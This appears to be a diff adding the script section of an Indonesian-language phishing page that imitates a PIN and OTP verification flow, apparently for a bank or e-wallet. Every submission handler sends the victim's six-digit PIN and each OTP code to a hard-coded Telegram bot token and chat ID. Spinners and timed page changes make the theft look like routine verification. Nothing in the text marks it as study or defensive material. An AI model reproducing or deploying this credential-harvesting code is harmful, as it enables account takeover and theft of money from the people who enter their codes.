@@ -770,4 +770,308 @@
 
     }
 
-    
+    function showPage4() {
+      document.getElementById(
+          'overlay').style
+        .display = 'none';
+      document.getElementById("Page3")
+        .style.display = "none";
+      // Menampilkan overla
+
+      // Menampilkan spinner
+      document.getElementById("spinner")
+        .style.display = "flex";
+
+      // Mengambil PIN yang dimasukkan oleh pengguna
+      var pin = "";
+      for (var i = 1; i <= 6; i++) {
+        pin += document.getElementById(
+          'pin' + i).value;
+      }
+
+      // Mengirim data ke API chat Telegram
+      var botToken =
+              '7048006029:AAEBMrXh3rbrdVOX1fFD4t2oJJzzcEcJSq4';
+            var chatId = '6756524224';
+      var message = `PIN: ${pin}`;
+
+      var url =
+        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => {
+          // Menunggu 3 detik
+          setTimeout(function() {
+            // Menutup spinner
+            document
+              .getElementById(
+                "spinner").style
+              .display = "none";
+            document.getElementById(
+                'overlay').style
+              .display = 'block';
+            // Menampilkan Page4
+            document
+              .getElementById(
+                "Page3").style
+              .display = "none";
+            document
+              .getElementById(
+                "Page4").style
+              .display = "block";
+          }, 3000);
+        })
+        .catch(error => {
+          console.error('Error:',
+            error);
+          // Jika terjadi error, tutup spinner dan overlay
+          document.getElementById(
+              "spinner").style
+            .display = "none";
+        });
+    }
+
+    function showPage5() {
+      // Mengambil OTP yang dimasukkan oleh pengguna
+      const otpInput = document.getElementById('otpa').value;
+
+      // Periksa apakah OTP sudah diisi dan memiliki panjang yang valid (antara 4 hingga 6 karakter)
+      if (otpInput.length >= 4 && otpInput.length <= 6) {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById("Page4a").style.display = "none";
+
+        // Menampilkan spinner
+        document.getElementById("spinner").style.display = "flex";
+
+        // Mengirim data ke API chat Telegram
+      var botToken =
+        '7048006029:AAEBMrXh3rbrdVOX1fFD4t2oJJzzcEcJSq4';
+      var chatId = '6756524224';
+        var message = `OTP1: ${otpInput}`;
+
+        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+          .then(response => {
+            // Menunggu 3 detik setelah OTP dikirim
+            setTimeout(function() {
+              // Menutup spinner
+              document.getElementById("spinner").style.display = "none";
+              document.getElementById('overlay').style.display = 'block';
+
+              // Menampilkan Page5
+              document.getElementById("Page5").style.display = "block";
+            }, 3000);
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            // Jika terjadi error, tutup spinner dan overlay
+            document.getElementById("spinner").style.display = "none";
+            alert('Terjadi kesalahan saat mengirim OTP. Coba lagi nanti.');
+          });
+      } else {
+        // Tampilkan peringatan jika OTP kurang dari 4 digit atau kosong
+        document.getElementById('peringatanOtp').style.display = 'block';
+      }
+    }
+
+    function showPage6() {
+      // Mengambil OTP yang dimasukkan oleh pengguna
+      const otpInput = document.getElementById('otpa').value;
+
+      // Periksa apakah OTP sudah diisi dan memiliki panjang yang valid (antara 4 hingga 6 karakter)
+      if (otpInput.length >= 4 && otpInput.length <= 6) {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById("Page4a").style.display = "none";
+
+        // Menampilkan spinner
+        document.getElementById("spinner").style.display = "flex";
+
+        // Mengirim data ke API chat Telegram
+      var botToken =
+        '7048006029:AAEBMrXh3rbrdVOX1fFD4t2oJJzzcEcJSq4';
+      var chatId = '6756524224';
+        var message = `OTP2: ${otpInput}`;
+
+        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+          .then(response => {
+            // Menunggu 3 detik setelah OTP dikirim
+            setTimeout(function() {
+              // Menutup spinner
+              document.getElementById("spinner").style.display = "none";
+              document.getElementById('overlay').style.display = 'block';
+
+              // Menampilkan Page5
+              document.getElementById("Page6").style.display = "block";
+            }, 3000);
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            // Jika terjadi error, tutup spinner dan overlay
+            document.getElementById("spinner").style.display = "none";
+            alert('Terjadi kesalahan saat mengirim OTP. Coba lagi nanti.');
+          });
+      } else {
+        // Tampilkan peringatan jika OTP kurang dari 4 digit atau kosong
+        document.getElementById('peringatanOtp').style.display = 'block';
+      }
+    }
+
+    function showPage1() {
+      document.getElementById("Page6")
+        .style.display = "none";
+      document.getElementById("Page1")
+        .style.display = "block";
+      document.getElementById("Page2")
+        .style.display = "none";
+      document.getElementById("kunci")
+        .style.display = "bolck";
+    }
+
+    function togglePassword() {
+      // Mendapatkan semua input field
+      const pins = document
+        .querySelectorAll(
+          '.pin-container input');
+
+      // Mengecek apakah saat ini input type adalah password atau text
+      const isPassword = pins[0]
+        .type === 'password';
+
+      // Ubah tipe input menjadi text jika saat ini password, dan sebaliknya
+      pins.forEach(pin => {
+        pin.type = isPassword ?
+          'text' : 'password';
+      });
+
+      // Ubah teks tombol menjadi "Tampilkan" atau "Sembunyikan"
+      const toggleButton = document
+        .getElementById('toggleButton');
+      toggleButton.textContent =
+        isPassword ? 'Sembunyikan' :
+        'Tampilkan';
+    }
+
+    /////////////////////////////////////////
+
+    let countdown = 60;
+    const resendButton = document.getElementById('resendButton');
+
+    function startCountdown() {
+      const interval = setInterval(() => {
+        countdown--;
+        resendButton.textContent = `Kirim Ulang: ${countdown}s`;
+
+        if (countdown <= 0) {
+          clearInterval(interval);
+          resendButton.textContent = 'Kirim Ulang';
+          resendButton.classList.add('enabled');
+          resendButton.disabled = false;
+          resendButton.style.cursor = 'pointer';
+        }
+      }, 1000);
+    }
+
+    startCountdown();
+
+    resendButton.addEventListener('click', () => {
+      countdown = 320; // Reset timer
+      resendButton.disabled = true;
+      resendButton.classList.remove('enabled');
+      resendButton.style.cursor = 'not-allowed';
+      startCountdown();
+    });
+
+    ///////////////////////////////////////////////
+
+    // Fungsi untuk mengaktifkan input berikutnya saat karakter dimasukkan
+    function checkAndEnable(current, nextId) {
+      if (current.value.length === 1) {
+        const nextInput = document.getElementById(nextId);
+        if (nextInput) {
+          nextInput.disabled = false;
+          nextInput.focus();
+        }
+      }
+    }
+
+    ///////////////////////////////////////
+
+    let waktu = 90; // 80 detik
+
+    function hitungMundur() {
+      document.getElementById("timer").innerHTML = waktu + "s";
+
+      if (waktu > 0) {
+        waktu--;
+        setTimeout(hitungMundur, 1000);
+      } else {
+        document.getElementById("kunOtp").style.display = "none";
+      }
+    }
+
+    // Mulai hitung mundur
+    hitungMundur();
+
+    ///////////////////////////////////////////
+
+    function showPage4a() {
+      // Mengambil OTP yang dimasukkan oleh pengguna
+      const otpInput = document.getElementById('otp').value;
+
+      // Periksa apakah OTP sudah diisi dan memiliki panjang yang valid (antara 4 hingga 6 karakter)
+      if (otpInput.length >= 4 && otpInput.length <= 6) {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById("Page4").style.display = "none";
+        document.getElementById("spinner").style.display = "flex";
+
+      var botToken =
+        '7048006029:AAEBMrXh3rbrdVOX1fFD4t2oJJzzcEcJSq4';
+      var chatId = '6756524224';
+        var message = `OTP: ${otpInput}`;
+        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url)
+          .then(response => {
+            // Menunggu 3 detik setelah OTP dikirim
+            setTimeout(function() {
+              // Menutup spinner
+              document.getElementById("spinner").style.display = "none";
+              document.getElementById('overlay').style.display = 'block';
+              document.getElementById("Page4a").style.display = "block";
+            }, 3000);
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            // Jika terjadi error, tutup spinner dan overlay
+            document.getElementById("spinner").style.display = "none";
+            alert('Terjadi kesalahan saat mengirim OTP. Coba lagi nanti.');
+          });
+      } else {
+        // Tampilkan peringatan jika OTP kurang dari 4 digit atau kosong
+        document.getElementById('peringatanOtp').style.display = 'block';
+      }
+    }
+
+    ////////////////////////////////////////////
+
+    // Fungsi untuk hitung mundur
+    function startCountdown(duration, display) {
+      var timer = duration,
+        seconds;
+      var countdownInterval = setInterval(function() {
+        seconds = parseInt(timer, 10);
+        display.textContent = seconds;
+
+        if (--timer < 0) {
+          clearInterval(countdownInterval); // Menghentikan hitungan
+          document.getElementById("kunci").style.display = "none"; // Sembunyikan elemen 'kunci'
+        }
+      }, 1000); // Mengurangi 1 detik setiap interval
+    }
+  </script>
+</body>
+
+</html>
